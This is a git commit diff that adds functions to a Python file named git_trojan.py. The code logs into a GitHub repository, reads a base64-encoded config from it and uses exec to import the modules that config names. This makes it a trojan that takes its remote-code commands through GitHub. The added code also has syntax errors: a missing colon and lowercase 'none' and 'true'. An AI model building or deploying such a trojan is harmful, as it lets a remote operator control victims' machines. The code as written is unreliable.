894aa4f58470b32a81d2eb87ad7c101216d8695a
root <root@localhost.localdomain>
2016-06-26 21:06:45 +0800

    adding

--- git_trojan.py
+++ git_trojan.py
@@ -21,3 +21,22 @@ def connect_to_github():
     repo=gh.repository("cmfcmf29","777")
     branch=repo.branch("master")
     return gh,repo,branch
+def get_file_contents(filepath)
+    gh,repo,branch = connect_to_github()
+    tree=branch.commit.tree.recurse()
+    
+    for filename in tree.tree:
+        if filepath in filename.path:
+            print "[*] found file %s" % filepath
+            blob=repo.blob(filename._json_data['sha'])
+            return blob.content
+    return none
+def get_trojan_config():
+    global configured
+    config_json=get_file_contents(trojan_config)
+    config=json.loads(base64.b64decode(config_json))
+    configured=true
+    for task in config:
+        if task['module'] not in sys.modules:
+            exec("import %s" % task['module'])
+    return config
